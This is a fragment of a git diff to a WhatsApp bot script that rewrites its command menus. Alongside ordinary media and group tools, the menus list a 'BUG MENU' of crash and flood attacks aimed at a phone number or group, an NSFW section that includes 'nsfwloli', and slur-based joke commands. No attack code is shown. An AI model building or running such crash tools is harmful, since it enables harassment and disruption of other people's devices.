+╠${prefix}setname [text]
+╠${prefix}setdesc [text]
+╠${prefix}group 
+╠${prefix}resetgrouplink
+╠${prefix}editinfo [option]
+╠${prefix}menfess [number]
+╠${prefix}add [user]
+╠${prefix}kick [reply/tag]
+╠${prefix}hidetag [text]
+╠${prefix}tagall [text]
+╠${prefix}antilinkgc [on/off]
+╠${prefix}antilinktg [on/off]
+╠${prefix}antilinktt [on/off]
+╠${prefix}antilinkytch [on/off]
+╠${prefix}antilinkytvid [on/off]
+╠${prefix}antilinkig [on/off]
+╠${prefix}antilinkfb [on/off]
+╠${prefix}antilinktwit [on/off]
+╠${prefix}antilinkall [on/off]
+╠${prefix}antivirus [on/off]
+╠${prefix}antitoxic [on/off]
+╠${prefix}antiwame [on/off]
+╠${prefix}nsfw [on/off]
+╠${prefix}promote [reply/tag]
+╠${prefix}demote [reply/tag]
+╠${prefix}react [reply emoji]
+╠${prefix}vote
+╠${prefix}devote
+╠${prefix}upvote
+╠${prefix}checkvote
+╠${prefix}delvote
+╠═══════✪ MAKER 
+╠${prefix}candy
+╠${prefix}blackpinkneon
+╠${prefix}deepsea
+╠${prefix}scifi
+╠${prefix}fiction
+╠${prefix}berry
+╠${prefix}fruitjuice
+╠${prefix}biscuit
+╠${prefix}wood
+╠${prefix}chocolate
+╠${prefix}matrix
+╠${prefix}blood
+╠${prefix}halloween
+╠${prefix}wicker
+╠${prefix}darkgold
+╠${prefix}firework
+╠${prefix}skeleton
+╠${prefix}sand
+╠${prefix}glue
+╠${prefix}leaves
+╠${prefix}magma
+╠${prefix}lava
+╠${prefix}rockart
+╠${prefix}bloodglas
+╠${prefix}underwater
+╠${prefix}textmaker
+╠${prefix}honey
+╠${prefix}ice
+╠${prefix}watercolor
+╠${prefix}multicolor
+╠${prefix}snow
+╠${prefix}harrypot
+╠${prefix}harrypotter
+╠${prefix}brokenglass
+╠${prefix}waterpipe
+╠${prefix}spooky
+╠${prefix}circuit
+╠${prefix}metallic
+╠${prefix}demon
+╠${prefix}sparklechristmas
+╠${prefix}christmas
+╠${prefix}3dchristmas
+╠${prefix}3dbox
+╠${prefix}waterdrop
+╠${prefix}lion2
+╠${prefix}papercut
+╠${prefix}transformer
+╠${prefix}neondevil
+╠${prefix}3davengers
+╠${prefix}3dstone
+╠${prefix}3dstone2
+╠${prefix}summertime
+╠${prefix}thunder
+╠${prefix}window
+╠${prefix}graffiti
+╠${prefix}graffitibike
+╠${prefix}pornhub
+╠${prefix}glitch
+╠${prefix}blackpinkart
+╠${prefix}glitch2
+╠${prefix}glitch3
+╠${prefix}3dspace
+╠${prefix}lion
+╠${prefix}3dneon
+╠${prefix}greenneon
+╠${prefix}bokeh
+╠${prefix}holographic
+╠${prefix}bear
+╠${prefix}wolf
+╠${prefix}joker
+╠${prefix}dropwater
+╠${prefix}dropwater2
+╠${prefix}thewall
+╠${prefix}neonlight
+╠${prefix}natural
+╠${prefix}carbon
+╠${prefix}pencil
+╠${prefix}blackpink2
+╠${prefix}neon
+╠${prefix}neonlight2
+╠${prefix}toxic
+╠${prefix}strawberry
+╠${prefix}discovery
+╠${prefix}1917
+╠ ${prefix}sci_fi
+╠ ${prefix}ancient
+╠ ${prefix}fabric
+╠ ${prefix}hoorror
+╠ ${prefix}whitebear
+╠ ${prefix}juice
+╠ ${prefix}batman
+╠ ${prefix}multicolor
+╠ ${prefix}wonderful
+╠ ${prefix}sketch
+╠ ${prefix}marvel
+╠ ${prefix}foggy
+╠ ${prefix}writing
+╠ ${prefix}halloweenfire
+╠ ${prefix}halloween
+╠ ${prefix}watercolor
+╠ ${prefix}classic
+╠═════✪ DOWNLOAD 	
+╠${prefix}tiktok [url]
+╠${prefix}tiktokaudio [url]
+╠${prefix}instagram [url]
+╠${prefix}spotify [url]
+╠${prefix}mediafire [url]
+╠${prefix}ytmp3 [url|quality]
+╠${prefix}ytmp4 [url|quality]
+╠${prefix}gitclone [repo link]
+╠═══════✪ SEARCH 	
+╠${prefix}play [query]
+╠${prefix}song [query]
+╠${prefix}yts [query]
+╠${prefix}lyrics [query]
+╠${prefix}gimage [query]
+╠${prefix}google [query]
+╠${prefix}anime [query]
+╠${prefix}pinterest [query]
+╠${prefix}image [query]
+╠${prefix}wallpaper [query]
+╠${prefix}searchno [number]
+╠${prefix}horoscope [query]
+╠${prefix}imdb [movie name]
+╠${prefix}weather [loc name]
+╠${prefix}genshin [char name]
+╠${prefix}wikimedia [query]
+╠${prefix}ytsearch [query]
+╠${prefix}ringtone [query]
+╠═══════✪ CONVERT 
+╠ ${prefix}toimage [reply stick]
+╠ ${prefix}sticker [reply img|gif]
+╠ ${prefix}take [reply img|gif|stik]
+╠ ${prefix}smeme [reply img]
+╠ ${prefix}emoji [emoji]
+╠ ${prefix}tovideo [reply img]
+╠ ${prefix}togif [reply stick]
+╠ ${prefix}tovn [reply aud]
+╠ ${prefix}tomp3 [reply vn]
+╠ ${prefix}toaudio [reply vid]
+╠ ${prefix}ebinary [reply txt]
+╠ ${prefix}dbinary [reply txt]
+╠ ${prefix}tinyurl [link]
+╠ ${prefix}styletext [text]
+╠${prefix}volume [reply aud]
+╠${prefix}bass [reply aud]
+╠${prefix}blown [reply aud]
+╠${prefix}deep [reply aud]
+╠${prefix}earrape [reply aud]
+╠${prefix}fast [reply aud]
+╠${prefix}fat [reply aud]
+╠${prefix}nightcore [reply aud]
+╠${prefix}reverse [reply aud]
+╠${prefix}robot [reply aud]
+╠${prefix}slow [reply aud]
+╠${prefix}smooth [reply aud]
+╠${prefix}squirrel [reply aud]
+╠═══════✪ IMG EFFECT 
+╠${prefix}removebg [reply img]
+╠═══════✪ RANDOM IMG 
+╠${prefix}coffee
+╠${prefix}woof
+╠${prefix}meow
+╠${prefix}lizard
+╠${prefix}chinese
+╠${prefix}japanese
+╠${prefix}korean
+╠${prefix}indo
+╠${prefix}thai
+╠${prefix}vietnamese
+╠${prefix}malay
+╠${prefix}hijab
+╠${prefix}randomgirl
+╠${prefix}randomboy
+╠${prefix}aesthetic
+╠${prefix}antiwork
+╠${prefix}cosplay
+╠${prefix}car
+╠${prefix}bike
+╠${prefix}doggo
+╠${prefix}cat
+╠${prefix}notnot
+╠${prefix}kayes
+╠${prefix}justina
+╠${prefix}ryujin
+╠${prefix}boneka
+╠${prefix}rose
+╠${prefix}kpop
+╠${prefix}blackpink
+╠${prefix}ulzzangboy
+╠${prefix}ulzzanggirl
+╠${prefix}pubg
+╠${prefix}hacking
+╠${prefix}profilepicture
+╠${prefix}couplepicture
+╠${prefix}wallphone
+╠${prefix}wallml
+╠═══════✪ RANDOM VIDEO
+╠${prefix}tiktokgirl	
+╠${prefix}tiktoknukhty
+╠${prefix}tiktokpanrika
+╠${prefix}tiktokkayes
+╠${prefix}tiktoknotnot
+╠${prefix}tiktokghea
+╠${prefix}tiktoksantuy
+╠${prefix}tiktokbocil
+╠═══════✪ EMOTE 
+╠${prefix}instagramemoji
+╠${prefix}facebookemoji
+╠${prefix}iphoneemoji
+╠${prefix}samsungemoji
+╠${prefix}joyemoji
+╠${prefix}skypeemoji
+╠${prefix}twitteremoji
+╠${prefix}whatsappemoji
+╠${prefix}microsoftemoji
+╠${prefix}googleemoji
+╠${prefix}pediaemoji
+╠${prefix}microsoftemoji
+╠═══════✪ ANIME 
+╠${prefix}animeneko
+╠${prefix}waifu
+╠${prefix}animewaifu
+╠${prefix}animeawoo
+╠${prefix}shinobu
+╠${prefix}foxgirl
+╠${prefix}animemegumin
+╠${prefix}loli-waifu
+╠${prefix}8ball
+╠${prefix}animenom
+╠${prefix}goose
+╠${prefix}avatar
+╠${prefix}tickle
+╠${prefix}gecg
+╠${prefix}feed
+╠${prefix}husbu
+╠${prefix}neko2
+╠${prefix}randomanime
+╠${prefix}shota
+╠${prefix}waifu2
+╠${prefix}animeslap
+╠${prefix}animepat
+╠${prefix}animeneko
+╠${prefix}animekiss
+╠${prefix}animewlp
+╠${prefix}animecuddle
+╠${prefix}animecry
+╠${prefix}animekill
+╠${prefix}animelick
+╠${prefix}animebite
+╠${prefix}animeyeet
+╠${prefix}animebully
+╠${prefix}animebonk
+╠${prefix}animewink
+╠${prefix}animepoke
+╠${prefix}animesmile
+╠${prefix}animewave
+╠${prefix}animeawoo
+╠${prefix}animeblush
+╠${prefix}animesmug
+╠${prefix}animeglomp
+╠${prefix}animehappy
+╠${prefix}animedance
+╠${prefix}animecringe
+╠${prefix}animehighfive
+╠${prefix}animehandhold
+╠${prefix}animemegumin
+╠${prefix}animesmug
+╠${prefix}couplepp
+╠${prefix}animewall [query]
+╠${prefix}animewall2 [query]
+╠══════✪ STICKER 
+╠ ${prefix}patrick
+╠ ${prefix}emoji
+╠ ${prefix}emojimix
+╠ ${prefix}doge
+╠ ${prefix}lovesticker
+╠ ${prefix}animestick
+╠ ${prefix}spongebob
+╠ ${prefix}gojosatoru
+╠ ${prefix}nicholas
+╠ ${prefix}cartoon
+╠ ${prefix}stickman
+╠════✪ ANIME STICKER 
+╠${prefix}loli
+╠${prefix}bully
+╠${prefix}cuddle
+╠${prefix}cry
+╠${prefix}hug
+╠${prefix}awoo
+╠${prefix}kiss
+╠${prefix}lick
+╠${prefix}pat
+╠${prefix}smug
+╠${prefix}bonk
+╠${prefix}yeet
+╠${prefix}blush
+╠${prefix}smile
+╠${prefix}wave
+╠${prefix}highfive
+╠${prefix}handhold
+╠${prefix}nom
+╠${prefix}glomp
+╠${prefix}bite
+╠${prefix}slap
+╠${prefix}kill
+╠${prefix}happy
+╠${prefix}wink
+╠${prefix}poke
+╠${prefix}dance
+╠${prefix}cringe
+╠${prefix}neko
+╠${prefix}gura
+╠═══════✪ NSFW 
+╠${prefix}gifhentai
+╠${prefix}gifblowjob
+╠${prefix}hentaivideo
+╠${prefix}hneko
+╠${prefix}nwaifu
+╠${prefix}animespank
+╠${prefix}trap
+╠${prefix}gasm
+╠${prefix}ahegao
+╠${prefix}ass
+╠${prefix}bdsm
+╠${prefix}blowjob
+╠${prefix}cuckold
+╠${prefix}cum
+╠${prefix}milf
+╠${prefix}eba
+╠${prefix}ero
+╠${prefix}femdom
+╠${prefix}foot
+╠${prefix}gangbang
+╠${prefix}glasses
+╠${prefix}hentai
+╠${prefix}jahy
+╠${prefix}manga
+╠${prefix}masturbation
+╠${prefix}neko-hentai
+╠${prefix}neko-hentai2
+╠${prefix}nsfwloli
+╠${prefix}orgy
+╠${prefix}panties
+╠${prefix}pussy
+╠${prefix}tentacles
+╠${prefix}thights
+╠${prefix}yuri
+╠${prefix}zettai
+╠═══════✪ FUN 
+╠ ${prefix}say [text]
+╠ ${prefix}define [text]
+╠ ${prefix}how [text
+╠ ${prefix}when [text]
+╠ ${prefix}where [text]
+╠ ${prefix}is [text]
+╠ ${prefix}what [text]
+╠ ${prefix}can [text]
+╠ ${prefix}rate [text]
+╠ ${prefix}coolcheck [tag]
+╠ ${prefix}stupidcheck [tag]
+╠ ${prefix}waifucheck [tag]
+╠ ${prefix}evilcheck [tag]
+╠ ${prefix}dogcheck [tag]
+╠ ${prefix}hotcheck [tag]
+╠ ${prefix}smartcheck [tag]
+╠ ${prefix}uncleancheck [tag]
+╠ ${prefix}greatcheck [tag]
+╠ ${prefix}beautifulcheck [tag]
+╠ ${prefix}awesomecheck [tag]
+╠ ${prefix}prettycheck [tag]
+╠ ${prefix}lesbiancheck [tag]
+╠ ${prefix}gaycheck [tag]
+╠ ${prefix}cutecheck [tag]
+╠ ${prefix}uglycheck [tag]
+╠ ${prefix}hornycheck [tag]
+╠ ${prefix}charactercheck [tag]
+╠ ${prefix}lovelycheck [tag]
+╠ ${prefix}couple
+╠ ${prefix}soulmate
+╠ ${prefix}hot
+╠ ${prefix}sexy
+╠ ${prefix}kind
+╠ ${prefix}idiot
+╠ ${prefix}handsome
+╠ ${prefix}beautiful
+╠ ${prefix}cute
+╠ ${prefix}pretty
+╠ ${prefix}lesbian
+╠ ${prefix}noob
+╠ ${prefix}bastard
+╠ ${prefix}foolish
+╠ ${prefix}nerd
+╠ ${prefix}asshole
+╠ ${prefix}gay
+╠ ${prefix}smart
+╠ ${prefix}stubble
+╠ ${prefix}dog
+╠ ${prefix}horny
+╠ ${prefix}cunt
+╠ ${prefix}wibu
+╠ ${prefix}noobra
+╠ ${prefix}nibba
+╠ ${prefix}nibbi
+╠ ${prefix}comrade
+╠ ${prefix}mumu
+╠ ${prefix}rascal
+╠ ${prefix}scumbag
+╠ ${prefix}nuts
+╠ ${prefix}fagot
+╠ ${prefix}scoundrel
+╠ ${prefix}ditch
+╠ ${prefix}dope
+╠ ${prefix}gucci
+╠ ${prefix}lit
+╠ ${prefix}dumbass
+╠ ${prefix}crackhead
+╠ ${prefix}mf
+╠ ${prefix}motherfucker
+╠ ${prefix}sucker
+╠ ${prefix}fuckboy
+╠ ${prefix}playboy
+╠ ${prefix}fuckgirl
+╠ ${prefix}playgirl
+╠ ${prefix}quotes
+╠══════✪ SOUND 
+╠ ${prefix}sound1
+╠ ${prefix}sound2
+╠ ${prefix}sound3
+╠ ${prefix}sound4
+╠ ${prefix}sound5
+╠ ${prefix}sound6
+╠ ${prefix}sound7
+╠ ${prefix}sound8
+╠ ${prefix}sound9
+╠ ${prefix}sound10
+╠ ${prefix}sound11
+╠ ${prefix}sound12
+╠ ${prefix}sound13
+╠ ${prefix}sound14
+╠ ${prefix}sound15
+╠ ${prefix}sound16
+╠ ${prefix}sound17
+╠ ${prefix}sound18
+╠ ${prefix}sound19
+╠ ${prefix}sound20
+╠ ${prefix}sound21
+╠ ${prefix}sound22
+╠ ${prefix}sound23
+╠ ${prefix}sound24
+╠ ${prefix}sound25
+╠ ${prefix}sound26
+╠ ${prefix}sound27
+╠ ${prefix}sound28
+╠ ${prefix}sound29
+╠ ${prefix}sound30
+╠ ${prefix}sound31
+╠ ${prefix}sound32
+╠ ${prefix}sound33
+╠ ${prefix}sound34
+╠ ${prefix}sound35
+╠ ${prefix}sound36
+╠ ${prefix}sound37
+╠ ${prefix}sound38
+╠ ${prefix}sound39
+╠ ${prefix}sound40
+╠ ${prefix}sound41
+╠ ${prefix}sound42
+╠ ${prefix}sound43
+╠ ${prefix}sound44
+╠ ${prefix}sound45
+╠ ${prefix}sound46
+╠ ${prefix}sound47
+╠ ${prefix}sound48
+╠ ${prefix}sound49
+╠ ${prefix}sound50
+╠ ${prefix}sound51
+╠ ${prefix}sound52
+╠ ${prefix}sound53
+╠ ${prefix}sound54
+╠ ${prefix}sound55
+╠ ${prefix}sound56
+╠ ${prefix}sound57
+╠ ${prefix}sound58
+╠ ${prefix}sound59
+╠ ${prefix}sound60
+╠ ${prefix}sound61
+╠ ${prefix}sound62
+╠ ${prefix}sound63
+╠ ${prefix}sound64
+╠ ${prefix}sound65
+╠ ${prefix}sound66
+╠ ${prefix}sound67
+╠ ${prefix}sound68
+╠ ${prefix}sound69
+╠ ${prefix}sound70
+╠ ${prefix}sound71
+╠ ${prefix}sound72
+╠ ${prefix}sound73
+╠ ${prefix}sound74
+╠ ${prefix}sound75
+╠ ${prefix}sound76
+╠ ${prefix}sound77
+╠ ${prefix}sound78
+╠ ${prefix}sound79
+╠ ${prefix}sound80
+╠ ${prefix}sound81
+╠ ${prefix}sound82
+╠ ${prefix}sound83
+╠ ${prefix}sound84
+╠ ${prefix}sound85
+╠ ${prefix}sound86
+╠ ${prefix}sound87
+╠ ${prefix}sound88
+╠ ${prefix}sound89
+╠ ${prefix}sound90
+╠ ${prefix}sound91
+╠ ${prefix}sound92
+╠ ${prefix}sound93
+╠ ${prefix}sound94
+╠ ${prefix}sound95
+╠ ${prefix}sound96
+╠ ${prefix}sound97
+╠ ${prefix}sound98
+╠ ${prefix}sound99
+╠ ${prefix}sound100
+╠ ${prefix}sound101
+╠ ${prefix}sound102
+╠ ${prefix}sound103
+╠ ${prefix}sound104
+╠ ${prefix}sound105
+╠ ${prefix}sound106
+╠ ${prefix}sound107
+╠ ${prefix}sound108
+╠ ${prefix}sound109
+╠ ${prefix}sound110
+╠ ${prefix}sound111
+╠ ${prefix}sound112
+╠ ${prefix}sound113
+╠ ${prefix}sound114
+╠ ${prefix}sound115
+╠ ${prefix}sound116
+╠ ${prefix}sound117
+╠ ${prefix}sound118
+╠ ${prefix}sound119
+╠ ${prefix}sound120
+╠ ${prefix}sound121
+╠ ${prefix}sound122
+╠ ${prefix}sound123
+╠ ${prefix}sound124
+╠ ${prefix}sound125
+╠ ${prefix}sound126
+╠ ${prefix}sound127
+╠ ${prefix}sound128
+╠ ${prefix}sound129
+╠ ${prefix}sound130
+╠ ${prefix}sound131
+╠ ${prefix}sound132
+╠ ${prefix}sound133
+╠ ${prefix}sound134
+╠ ${prefix}sound135
+╠ ${prefix}sound136
+╠ ${prefix}sound137
+╠ ${prefix}sound138
+╠ ${prefix}sound139
+╠ ${prefix}sound140
+╠ ${prefix}sound141
+╠ ${prefix}sound142
+╠ ${prefix}sound143
+╠ ${prefix}sound144
+╠ ${prefix}sound145
+╠ ${prefix}sound146
+╠ ${prefix}sound147
+╠ ${prefix}sound148
+╠ ${prefix}sound149
+╠ ${prefix}sound150
+╠ ${prefix}sound151
+╠ ${prefix}sound152
+╠ ${prefix}sound153
+╠ ${prefix}sound154
+╠ ${prefix}sound155
+╠ ${prefix}sound156
+╠ ${prefix}sound157
+╠ ${prefix}sound158
+╠ ${prefix}sound159
+╠ ${prefix}sound160
+╠ ${prefix}sound161
+╠══════✪ GAME 
+╠ ${prefix}truth
+╠ ${prefix}dare
+╠ ${prefix}tictactoe
+╠ ${prefix}delttt
+╠ ${prefix}guess [option]
+╠ ${prefix}math [mode]
+╠ ${prefix}suitpvp [tag]
+╠══✪ ANONYMOUS CHAT 
+╠${prefix}anonymous
+╠${prefix}start
+╠${prefix}next
+╠${prefix}leave
+╠══════✪ DATABASE 
+╠ ${prefix}setcmd
+╠ ${prefix}listcmd
+╠ ${prefix}delcmd
+╠ ${prefix}lockcmd
+╠ ${prefix}addmsg
+╠ ${prefix}listmsg
+╠ ${prefix}getmsg
+╠ ${prefix}delmsg
+╠══════✪ OTHER 
+╠ ${prefix}afk
+╠ ${prefix}id
+╠ ${prefix}toqr [link]
+╠ ${prefix}repeat
+╠ ${prefix}readmore [text]
+╠ ${prefix}toviewonce
+╠ ${prefix}fliptext [text]]
+╠ ${prefix}chatinfo
+╠ ${prefix}alive
+╠ ${prefix}script
+╠ ${prefix}ping
+╠ ${prefix}owner
+╠ ${prefix}menu
+╠ ${prefix}delete
+╠ ${prefix}quoted
+╠ ${prefix}listpc
+╠ ${prefix}listgc
+╠ ${prefix}donate
+╠ ${prefix}request
+╠ ${prefix}report [bug]
+╠═══════✪「 BUG MENU 」	
+╠════☾pc attack☽
+╠${prefix}pcbut [number]
+╠${prefix}pcvn [number]
+╠${prefix}pcstick [number]
+╠${prefix}pcfast [number]
+╠${prefix}pcslow [number]
+╠${prefix}pcbunny [number]
+╠${prefix}xcrasher [amount]
+╠${prefix}pccontact [amount]
+╠${prefix}virtex5 [amount]
+╠${prefix}flower [amount]
+╠${prefix}pollbug [amount]
+╠${prefix}catalogbug [amount]
+╠${prefix}trollybug [amount]
+╠${prefix}trollybug2 [amount]
+╠════☾gc attack☽
+╠${prefix}gcslow
+╠${prefix}gcfast
+╠${prefix}gcbunny
+╠${prefix}tagallbug
+╠════☾pc & gc attack☽
+╠${prefix}vnbug [amount]
+╠${prefix}docbug [amount]
+╠${prefix}pcgcslow [number]
+╠${prefix}pcgcfast [number]
+╠${prefix}pcgcbunny [number]
+╠${prefix}textshot
+╠${prefix}docfuck [amount]
+╠${prefix}docsoft [amount]
+╠${prefix}docsoft2 [amount]
 ╚═════════════✪`,
     footer: `${botname}`,
-    buttons: buttons,
+    //buttons: buttons,
     headerType: 4
 }
 const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
@@ -8085,28 +8417,26 @@ break
       case 'ownermenu':{
 	   var unicorn = await getBuffer(picak+'Owner Menu')
 const buttons = [
-  {buttonId: 'script', buttonText: {displayText: 'Script💎 '}, type: 1},
-  {buttonId: 'donate', buttonText: {displayText: 'ALIVE'}, type: 1},
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
   {buttonId: 'owner', buttonText: {displayText: 'Owner ??'}, type: 1}
 ]
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ OWNER 	
- 🤴${prefix}self
- 🤴${prefix}public
- 🤴${prefix}join [link]
- 🤴${prefix}leavegc
- 🤴${prefix}setbio
- 🤴${prefix}bctext [text]
- 🤴${prefix}bcimage [reply img/text]
- 🤴${prefix}bcvideo [reply img/text]
- 🤴${prefix}setbotpp [image]
- 🤴${prefix}setthumb [reply img]
- 🤴${prefix}setexif
- 🤴${prefix}hijack
- 🤴${prefix}creategroup [name]
- 🤴${prefix}block [tag/number]
- 🤴${prefix}unblock [tag/number]
+╠ ${prefix}self
+╠ ${prefix}public
+╠ ${prefix}join [link]
+╠ ${prefix}leavegc
+╠ ${prefix}setbio
+╠ ${prefix}hijack
+╠ ${prefix}creategroup [name]
+╠ ${prefix}block [user]
+╠ ${prefix}unblock [user]
+╠ ${prefix}broadcast [text]
+╠ ${prefix}setppbot [image]
+╠ ${prefix}setthumb [reply img]
+╠ ${prefix}setexif
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8119,47 +8449,52 @@ break
 var unicorn = await getBuffer(picak+'Group Menu')
 
 const buttons = [
-  {buttonId: 'script', buttonText: {displayText: 'Script💎 '}, type: 1},
-  {buttonId: 'donate', buttonText: {displayText: 'ALIVE'}, type: 1},
-  {buttonId: 'owner', buttonText: {displayText: 'Owner'}, type: 1}
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
 ]
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ GROUP 	
-💎${prefix}grouplink
-💎${prefix}ephemeral [option]
-💎${prefix}setgcpp [image]
-💎${prefix}setname [text]
-💎${prefix}setdesc [text]
-💎${prefix}group 
-💎${prefix}resetgrouplink
-💎${prefix}editinfo [option]
-💎${prefix}menfess [number]
-💎${prefix}add [user]
-💎${prefix}kick [reply/tag]
-💎${prefix}hidetag [text]
-💎${prefix}tagall [text]
-💎${prefix}antilinkgc [on/off]
-💎${prefix}antilinktg [on/off]
-💎${prefix}antilinktt [on/off]
-💎${prefix}antilinkytch [on/off]
-💎${prefix}antilinkytvid [on/off]
-💎${prefix}antilinkig [on/off]
-💎${prefix}antilinkfb [on/off]
-💎${prefix}antilinktwit [on/off]
-💎${prefix}antilinkall [on/off]
-💎${prefix}antivirus [on/off]
-💎${prefix}antitoxic [on/off]
-💎${prefix}antiwame [on/off]
-💎${prefix}nsfw [on/off]
-💎${prefix}promote [reply/tag]
-💎${prefix}demote [reply/tag]
-💎${prefix}react [reply emoji]
-💎${prefix}vote
-💎${prefix}devote
-💎${prefix}upvote
-💎${prefix}checkvote
-💎${prefix}delvote
+╠${prefix}grouplink
+╠${prefix}ephemeral [option]
+╠${prefix}setgcpp [image]
+╠${prefix}setname [text]
+╠${prefix}setdesc [text]
+╠${prefix}group
+╠${prefix}botgroups
+╠${prefix}resetgrouplink
+╠${prefix}editinfo [option]
+╠${prefix}add [user]
+╠${prefix}menfess [number]
+╠${prefix}kick [reply/tag]
+╠${prefix}hidetag [text]
+╠${prefix}tagall [text]
+╠${prefix}autosticker [on/off]
+╠${prefix}autostickerpc [on/off]
+╠${prefix}leveling [on/off]
+╠${prefix}antilinkgc [on/off] 
+╠${prefix}antilinktg [on/off]
+╠${prefix}antilinktt [on/off]
+╠${prefix}antilinkytch [on/off]
+╠${prefix}antilinkytvid [on/off]
+╠${prefix}antilinkig [on/off]
+╠${prefix}antilinkfb [on/off]
+╠${prefix}antilinktwit [on/off]
+╠${prefix}antilinkall [on/off]
+╠${prefix}antivirus [on/off]
+╠${prefix}antitoxic [on/off]
+╠${prefix}antiwame [on/off]
+╠${prefix}nsfw [on/off]
+╠${prefix}promote [reply/tag]
+╠${prefix}demote [reply/tag]
+╠${prefix}react [reply emoji]
+╠${prefix}getpp [reply user]
+╠${prefix}vote
+╠${prefix}devote
+╠${prefix}upvote
+╠${prefix}checkvote
+╠${prefix}delvote
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8172,114 +8507,118 @@ case 'makermenu':{
 var unicorn = await getBuffer(picak+'Maker Menu')
 
 const buttons = [
-  {buttonId: 'script', buttonText: {displayText: 'Script💎'}, type: 1},
-  {buttonId: 'donate', buttonText: {displayText: 'ALIVE'}, type: 1},
-  {buttonId: 'owner', buttonText: {displayText: 'Owner'}, type: 1}
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
 ]
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ MAKER 	
-🧚‍♀️${prefix}candy
-🧚‍♀️${prefix}blackpinkneon
-🧚‍♀️${prefix}deepsea
-🧚‍♀️${prefix}scifi
-🧚‍♀️${prefix}fiction
-🧚‍♀️${prefix}berry
-🧚‍♀️${prefix}fruitjuice
-🧚‍♀️${prefix}biscuit
-🧚‍♀️${prefix}wood
-🧚‍♀️${prefix}chocolate
-🧚‍♀️${prefix}matrix
-🧚‍♀️${prefix}blood
-🧚‍♀️${prefix}halloween
-🧚‍♀️${prefix}wicker
-🧚‍♀️${prefix}darkgold
-🧚‍♀️${prefix}firework
-🧚‍♀️${prefix}skeleton
-🧚‍♀️${prefix}sand
-🧚‍♀️${prefix}glue
-🧚‍♀️${prefix}leaves
-🧚‍♀️${prefix}magma
-🧚‍♀️${prefix}lava
-🧚‍♀️${prefix}rockart
-🧚‍♀️${prefix}bloodglas
-🧚‍♀️${prefix}underwater
-🧚‍♀️${prefix}textmaker
-🧚‍♀️${prefix}honey
-🧚‍♀️${prefix}ice
-🧚‍♀️${prefix}watercolor
-🧚‍♀️${prefix}multicolor
-🧚‍♀️${prefix}snow
-🧚‍♀️${prefix}harrypot
-🧚‍♀️${prefix}harrypotter
-🧚‍♀️${prefix}brokenglass
-🧚‍♀️${prefix}waterpipe
-🧚‍♀️${prefix}spooky
-🧚‍♀️${prefix}circuit
-🧚‍♀️${prefix}metallic
-🧚‍♀️${prefix}demon
-🧚‍♀️${prefix}sparklechristmas
-🧚‍♀️${prefix}christmas
-🧚‍♀️${prefix}3dchristmas
-🧚‍♀️${prefix}3dbox
-🧚‍♀️${prefix}waterdrop
-🧚‍♀️${prefix}lion2
-🧚‍♀️${prefix}papercut
-🧚‍♀️${prefix}transformer
-🧚‍♀️${prefix}neondevil
-🧚‍♀️${prefix}3davengers
-🧚‍♀️${prefix}3dstone
-🧚‍♀️${prefix}3dstone2
-🧚‍♀️${prefix}summertime
-🧚‍♀️${prefix}thunder
-🧚‍♀️${prefix}window
-🧚‍♀️${prefix}graffiti
-🧚‍♀️${prefix}graffitibike
-🧚‍♀️${prefix}pornhub
-🧚‍♀️${prefix}glitch
-🧚‍♀️${prefix}blackpinkart
-🧚‍♀️${prefix}glitch2
-🧚‍♀️${prefix}glitch3
-🧚‍♀️${prefix}3dspace
-🧚‍♀️${prefix}lion
-🧚‍♀️${prefix}3dneon
-🧚‍♀️${prefix}greenneon
-🧚‍♀️${prefix}bokeh
-🧚‍♀️${prefix}holographic
-🧚‍♀️${prefix}bear
-🧚‍♀️${prefix}wolf
-🧚‍♀️${prefix}joker
-🧚‍♀️${prefix}dropwater
-🧚‍♀️${prefix}dropwater2
-🧚‍♀️${prefix}thewall
-🧚‍♀️${prefix}neonlight
-🧚‍♀️${prefix}natural
-🧚‍♀️${prefix}carbon
-🧚‍♀️${prefix}pencil
-🧚‍♀️${prefix}blackpink2
-🧚‍♀️${prefix}neon
-🧚‍♀️${prefix}neonlight2
-🧚‍♀️${prefix}toxic
-🧚‍♀️${prefix}strawberry
-🧚‍♀️${prefix}discovery
-🧚‍♀️${prefix}1917
-🧚‍♀️${prefix}sci_fi
-🧚‍♀️${prefix}ancient
-🧚‍♀️ ${prefix}fabric
-🧚‍♀️ ${prefix}hoorror
-🧚‍♀️ ${prefix}whitebear
-🧚‍♀️ ${prefix}juice
-🧚‍♀️ ${prefix}batman
-🧚‍♀️ ${prefix}multicolor
-🧚‍♀️ ${prefix}wonderful
-🧚‍♀️ ${prefix}sketch
-🧚‍♀️ ${prefix}marvel
-🧚‍♀️${prefix}foggy
-🧚‍♀️ ${prefix}writing
-🧚‍♀️ ${prefix}halloweenfire
-🧚‍♀️ ${prefix}halloween
-🧚‍♀️ ${prefix}watercolor
-🧚‍♀️ ${prefix}classic
+╠${prefix}candy
+╠${prefix}8bit
+╠${prefix}horror
+╠${prefix}hoorror
+╠${prefix}retro
+╠${prefix}blackpinkneon
+╠${prefix}deepsea
+╠${prefix}scifi
+╠${prefix}fiction
+╠${prefix}berry
+╠${prefix}fruitjuice
+╠${prefix}biscuit
+╠${prefix}wood
+╠${prefix}chocolate
+╠${prefix}matrix
+╠${prefix}blood
+╠${prefix}halloween
+╠${prefix}wicker
+╠${prefix}darkgold
+╠${prefix}firework
+╠${prefix}skeleton
+╠${prefix}sand
+╠${prefix}glue
+╠${prefix}leaves
+╠${prefix}magma
+╠${prefix}lava
+╠${prefix}rockart
+╠${prefix}bloodglas
+╠${prefix}underwater
+╠${prefix}textmaker
+╠${prefix}honey
+╠${prefix}ice
+╠${prefix}watercolor
